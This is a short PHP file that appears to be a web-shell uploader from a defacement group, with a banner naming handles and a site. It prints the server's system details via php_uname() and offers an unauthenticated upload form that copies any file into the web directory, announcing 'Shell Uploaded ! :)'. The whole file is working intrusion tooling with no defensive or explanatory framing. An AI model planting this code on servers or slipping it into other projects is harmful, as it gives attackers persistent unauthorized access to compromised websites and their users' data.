<?php
echo '<img class=" height="200" src="https://i.ibb.co/64PG4Zp/images.png"/><title>Blog-Gan.org/title>';
echo '<b><font face="Courier new" color="black" size="6">| _ByME - Jenderal92 - Ajibarang1337 - https://www.blog-gan.org |</b></font>';
echo "<b>".php_uname()."</b><br>";
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>';}
}
?>
